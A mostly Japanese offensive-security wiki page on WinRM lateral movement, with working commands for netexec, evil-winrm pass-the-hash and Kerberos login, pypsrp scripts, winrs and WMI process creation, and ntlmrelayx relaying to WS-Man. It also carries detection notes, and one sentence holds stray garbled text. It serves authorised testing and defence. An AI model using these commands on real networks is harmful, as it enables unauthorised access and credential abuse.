# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM は、Windows 環境で最も便利な **lateral movement** トランスポートの1つです。SMB のサービス作成トリックを使わずに、**WS-Man/HTTP(S)** 経由でリモートシェルを得られるからです。対象が **5985/5986** を公開していて、かつあなたの主体に remoting の利用が許可されていれば、しばしば "valid creds" から "interactive shell" まで非常に素早く到達できます。

**protocol/service enumeration**、リスナー、WinRM の有効化、`Invoke-Command`、一般的なクライアント利用については、こちらを確認してください:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## なぜ operators は WinRM を好むのか

- **HTTP/HTTPS** を使うため、SMB/RPC がブロックされる環境でも動くことが多い。
- **Kerberos** では、再利用可能な認証情報を対象へ送信しない。
- **Windows**, **Linux**, **Python** の各ツール（`winrs`, `evil-winrm`, `pypsrp`, `netexec`）からきれいに使える。
- 対話的な PowerShell remoting では、認証されたユーザーコンテキストの下で対象側に **`wsmprovhost.exe`** が起動する。これは service-based exec とは運用上異なる。

## アクセスモデルと前提条件

実際には、WinRM による lateral movement の成功は **3つ** に依存します。

1. 対象に **WinRM listener** (`5985`/`5986`) があり、アクセスを許可する firewall rules が設定されていること。
2. アカウントがその endpoint に **authenticate** できること。
3. アカウントが remoting session を **open** できること。

そのアクセスを得る一般的な方法:

- 対象での **Local Administrator**。
- 新しいシステムでは **Remote Management Users**、またはその group をまだ尊重するシステム/コンポーネントでは **WinRMRemoteWMIUsers__** への所属。
- local security descriptors / PowerShell remoting の ACL 変更を通じて明示的に委任された remoting 権限。

すでに admin 権限付きの box を支配しているなら、ここで説明している手法を使って **完全な admin group membership がなくても WinRM access を委任** できることを忘れないでください:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### lateral movement 中に重要な authentication の落とし穴

- **Kerberos には hostname/FQDN が必要**。IP で接続すると、クライアントは通常 **NTLM/Negotiate** にフォールバックします。
- **workgroup** や cross-trust の境界ケースでは、NTLM は多くの場合 **HTTPS** か、クライアント側の **TrustedHosts** への対象追加が必要です。
- workgroup 環境で **local accounts** を Negotiate 経由で使う場合、UAC remote restrictions により、組み込み Administrator アカウントを使うか `LocalAccountTokenFilterPolicy=1` でないとアクセスできないことがあります。
- PowerShell remoting は既定で **`HTTP/<host>` SPN** を使います。`HTTP/<host>` がすでに別の service account に登録されている環境では、WinRM Kerberos が `0x80090322` で失敗することがあります。その場合は port-qualified SPN を使うか、存在するなら **`WSMAN/<host>`** に切り替えてください。

password spraying で valid creds を得たなら、それが shell につながるかを確認する最速の方法は、WinRM 経由で検証することです:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec による validation と one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRMによる対話型シェル

`evil-winrm` は、**パスワード**、**NTハッシュ**、**Kerberosチケット**、**クライアント証明書**、ファイル転送、そしてメモリ上でのPowerShell/.NETロードをサポートしているため、Linuxから使える最も便利な対話型オプションのままです。
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPNの例外ケース: `HTTP` vs `WSMAN`

デフォルトの **`HTTP/<host>`** SPN がKerberosの失敗を引き起こす場合は、代わりに **`WSMAN/<host>`** チケットの要求/使用を試してください。これは、`HTTP/<host>` がすでに別のサービスアカウントに割り当てられている、強化された環境や特殊な企業環境で見られます。
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
これは、**RBCD / S4U** abuse の後に、汎用の `HTTP` ticket ではなく、特に **WSMAN** service ticket を forged または request した場合にも有用です。

### Certificate-based authentication

WinRM は **client certificate authentication** もサポートしますが、その certificate は target 上で **local account** に mapped されている必要があります。攻撃者視点では、これは次のような場合に重要です:

- WinRM 用にすでに mapped されている有効な client certificate と private key を stolen/exported した場合;
- **AD CS / Pass-the-Certificate** を abused して principal の certificate を取得し、その後別の authentication path に pivot する場合;
- password-based remoting を意図的に避けている environment で operation している場合。
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM は password/hash/Kerberos auth よりはるかに一般的ではありませんが、存在する場合は、password rotation をまたいで有効な **passwordless lateral movement** パスを提供できます。

### Python / automation with `pypsrp`

operator shell ではなく automation が必要な場合、`pypsrp` は **NTLM**、**certificate auth**、**Kerberos**、および **CredSSP** をサポートする Python からの WinRM/PSRP を提供します。
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
高レベルの `Client` ラッパーよりも細かな制御が必要な場合、低レベルの `WSMan` + `RunspacePool` API は、2つの一般的なoperatorの問題に役立ちます:

- 多くの PowerShell clients が使うデフォルトの `HTTP` 想定ではなく、Kerberos の service/SPN として **`WSMAN`** を強制すること；
- `Microsoft.PowerShell` ではなく、**JEA** / custom session configuration のような **non-default PSRP endpoint** に接続すること。
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### カスタム PSRP endpoints と JEA は lateral movement 時に重要

WinRM の認証に成功しても、必ずしもデフォルトの制限なし `Microsoft.PowerShell` endpoint に入れるとは限りません。成熟した環境では、独自の ACL と run-as 挙動を持つ **custom session configurations** や **JEA** endpoints が公開されている場合があります。

すでに Windows ホスト上で code execution を持っていて、どの remoting surface が存在するか把握したい場合は、登録済みの endpoints を列挙します:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
有用な endpoint が存在する場合は、デフォルトの shell ではなく、それを明示的に target してください:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
実践的な攻撃面での影響:

- **restricted** な endpoint でも、service control、file access、process creation、または任意の .NET / external command execution に必要な適切な cmdlets/functions だけを公開していれば、lateral movement に十分な場合があります。
- **misconfigured JEA** role は、`Start-Process`、広い wildcards、書き込み可能な providers、または想定された制限を回避できる custom proxy functions など、危険な commands を公開している場合に特に有用です。
- **RunAs virtual accounts** や **gMSAs** を使う endpoints は、実行する commands の effective security context を変えます。特に、gMSA-backed endpoint は、通常の WinRM session では classic delegation problem に直面する場合でも、**second hop で network identity** を提供できます。

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` は組み込みで、interactive PowerShell remoting session を開かずに **native WinRM command execution** を使いたいときに便利です:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
実際には、2つのフラグを忘れがちで、重要です。

- `/noprofile` は、リモートの主体が **ローカル管理者ではない** 場合に、しばしば必要です。
- `/allowdelegate` は、リモートシェルがあなたの認証情報を **第三のホスト** に対して使えるようにします（たとえば、コマンドが `\\fileserver\share` を必要とする場合）。
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
運用上、`winrs.exe` は一般的に次のようなリモートプロセスチェーンになります:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
これは覚えておく価値があります。なぜなら、service-based exec や interactive PSRP sessions とは異なるからです。

### `winrm.cmd` / PowerShell remoting の代わりに WS-Man COM

**Enter-PSSession** を使わずに、WS-Man 経由で WMI classes を呼び出すことで **WinRM transport** ിലൂടെ実行することもできます。これにより transport は WinRM のまま維持され、remote execution primitive は **WMI `Win32_Process.Create`** になります:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
そのアプローチは次のような場合に有用です:

- PowerShell logging が強く監視されている。
- 典型的な PS remoting workflow ではなく、**WinRM transport** を使いたい。
- **`WSMan.Automation`** COM object を中心にした custom tooling を作成している、または使用している。

## NTLM relay to WinRM (WS-Man)

SMB relay が signing によってブロックされ、LDAP relay に制約がある場合でも、**WS-Man/WinRM** は依然として魅力的な relay target になり得ます。Modern な `ntlmrelayx.py` には **WinRM relay servers** が含まれており、**`wsman://`** または **`winrms://`** targets へ relay できます。
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Two practical notes:

- Relay is most useful when the target accepts **NTLM** and the relayed principal is allowed to use WinRM.
- Recent Impacket code specifically handles **`WSMANIDENTIFY: unauthenticated`** requests so `Test-WSMan`-style probes do not break the relay flow.

For multi-hop constraints after landing a first WinRM session, check:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC and detection notes

- **Interactive PowerShell remoting** usually creates **`wsmprovhost.exe`** on the target.
- **`winrs.exe`** commonly creates **`winrshost.exe`** and then the requested child process.
- Custom **JEA** endpoints may execute actions as **`WinRM_VA_*`** virtual accounts or as a configured **gMSA**, which changes both telemetry and second-hop behavior compared to a normal user-context shell.
- Expect **network logon** telemetry, WinRM service events, and PowerShell operational/script-block logging if you use PSRP rather than raw `cmd.exe`.
- If you only need a single command, `winrs.exe` or one-shot WinRM execution may be quieter than a long-lived interactive remoting session.
- If Kerberos is available, prefer **FQDN + Kerberos** over IP + NTLM to reduce both trust issues and awkward client-side `TrustedHosts` changes.

## References

- [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [pypsrp README](https://github.com/jborean93/pypsrp)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
